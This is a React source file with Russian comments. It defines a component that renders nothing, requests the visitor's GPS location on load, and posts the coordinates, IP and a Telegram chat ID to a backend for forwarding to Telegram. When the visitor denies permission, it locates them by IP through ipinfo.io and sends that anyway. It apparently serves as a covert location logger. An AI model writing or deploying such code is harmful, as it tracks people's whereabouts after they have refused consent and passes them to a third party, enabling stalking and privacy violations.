import axios from 'axios';
import React, { useEffect } from 'react'
import API_CONFIG from '../api/config';

/**
 * LocationHandler - Компонент для автоматического получения и отправки геолокации пользователя
 * 
 * Логика работы:
 * 1. При монтировании компонента автоматически запрашивает доступ к геолокации через GPS
 * 2. Если пользователь дает разрешение - получает точные координаты GPS
 * 3. Если пользователь отклоняет запрос - получает приблизительное местоположение по IP-адресу
 * 4. Отправляет полученные координаты на backend для дальнейшей передачи в Telegram
 * 
 * Props:
 * @param {Function} setLocationPermission - Функция для сохранения координат в состоянии родительского компонента
 * @param {Function} setLocationSent - Функция для установки флага успешной отправки локации
 * @param {Object|null} locationPermission - Текущие сохраненные координаты (null если еще не получены)
 * @param {string} chatId - ID чата Telegram для отправки локации
 * @param {string} clientIp - IP-адрес клиента для резервного определения местоположения
 */
const LocationHandler = ({setLocationPermission, setLocationSent, locationPermission, chatId, clientIp}) => {

  /**
   * Отправляет координаты на backend сервер для дальнейшей передачи в Telegram
   * 
   * @param {Object} coords - Объект с координатами
   * @param {string} coords.latitude - Широта
   * @param {string} coords.longitude - Долгота
   */
  const sendLocation = async (coords) => {
    const { latitude, longitude } = coords;
    
    // Формируем URL для отправки локации на backend
    const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendLocationToTelegram}`;
    
    // Подготавливаем данные для отправки
    const data = { 
      chat_id: chatId,      // ID чата в Telegram
      latitude, 
      longitude, 
      clientIp              // IP для логирования/аналитики
    };

    try {
      // Отправляем POST запрос на backend с координатами
      await axios.post(apiUrl, data, {
        headers: {
          'Content-Type': 'application/json',
        },
        timeout: 10000 // 10 секунд таймаут для предотвращения зависания
      });
      
      console.log("Location sent to Telegram");
      setLocationSent(true); // Устанавливаем флаг успешной отправки
    } catch (error) {
      console.error("Error sending location to server:", error);
      // В случае ошибки не блокируем работу приложения
    }
  };


  /**
   * Резервный метод получения местоположения по IP-адресу
   * Используется когда пользователь отклоняет запрос на доступ к GPS
   * 
   * Процесс:
   * 1. Делает запрос к публичному API ipinfo.io для получения информации об IP
   * 2. Извлекает координаты из поля "loc" (формат: "широта,долгота")
   * 3. Парсит строку координат в объект
   * 4. Отправляет координаты на сервер и сохраняет в состоянии
   */
  const getLocationByIp = async () => {
    try {
      // Запрашиваем информацию о местоположении по IP
      const response = await axios.get(`https://ipinfo.io/${clientIp}/json`);
      
      // Извлекаем поле "loc" которое содержит "широта,долгота"
      const { loc } = response.data;
      
      // Разделяем строку на отдельные координаты
      const [latitude, longitude] = loc.split(',');
      
      // Создаем объект координат в нужном формате
      const coords = { latitude, longitude };
      
      // Отправляем на сервер и сохраняем в состоянии
      sendLocation(coords);
      setLocationPermission(coords);
    } catch (error) {
      console.error("Error fetching location by IP:", error);
      // Если и IP-геолокация не работает, приложение продолжает работать без координат
    }
  };



  /**
   * Основной метод запроса разрешения на доступ к геолокации через GPS
   * 
   * Алгоритм работы:
   * 1. Запрашивает у браузера доступ к GPS через navigator.geolocation.getCurrentPosition
   * 2. Оборачивает асинхронный callback API в Promise для удобства использования
   * 3. При успехе - извлекает точные координаты GPS и сохраняет их
   * 4. При отказе пользователя - показывает уведомление и переключается на IP-геолокацию
   * 5. При других ошибках - логирует ошибку
   */
  const requestLocationPermission = async () => {
    try {
      // Оборачиваем callback-based API геолокации в Promise
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          resolve,  // Вызывается при успешном получении координат
          reject    // Вызывается при ошибке или отказе пользователя
        );
      });

      // Извлекаем координаты из объекта позиции
      const { latitude, longitude } = position.coords;
      const coords = { latitude, longitude };
      
      // Сохраняем разрешение в localStorage для будущих сессий
      localStorage.setItem("locationPermission", JSON.stringify(coords));
      
      // Обновляем состояние родительского компонента
      setLocationPermission(coords);

      // Отправляем координаты на сервер
      sendLocation(coords);
      
    } catch (error) {
      // Проверяем тип ошибки
      if (error.code === error.PERMISSION_DENIED) {
        // Пользователь отклонил запрос на доступ к геолокации
        alert("Пожалуйста, включите доступ к местоположению в настройках вашего устройства.");
        
        // Переключаемся на резервный метод - определение местоположения по IP
        getLocationByIp();
      } else {
        // Другие ошибки (например, GPS недоступен, таймаут и т.д.)
        console.error("Error getting location permission:", error);
      }
    }
  };

  /**
   * Эффект для автоматического запуска получения геолокации при монтировании компонента
   * 
   * Срабатывает только один раз при первом рендере компонента.
   * Проверяет, есть ли уже сохраненные координаты в состоянии.
   * Если координат нет - запускает процесс их получения.
   */
  useEffect(() => {
    // Запускаем получение геолокации только если она еще не была получена
    if (!locationPermission) {
      requestLocationPermission();
    }
  }, []); // Пустой массив зависимостей = выполнится только при монтировании

  /**
   * Компонент не рендерит никакого UI - он работает "в фоне"
   * Вся логика выполняется через useEffect и асинхронные функции
   */
  return (
    <>
    </>
  )
}

export default LocationHandler